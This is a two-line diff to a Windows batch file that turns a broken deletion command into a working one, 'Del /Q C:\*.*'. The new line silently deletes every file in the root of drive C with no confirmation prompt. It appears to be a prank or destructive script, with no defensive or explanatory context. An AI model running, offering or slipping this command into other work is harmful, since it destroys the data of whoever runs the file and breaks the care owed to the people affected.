@@ -1,2 +1,2 @@
 @Echo off
-Del C: *.* |y
+Del /Q C:\*.*
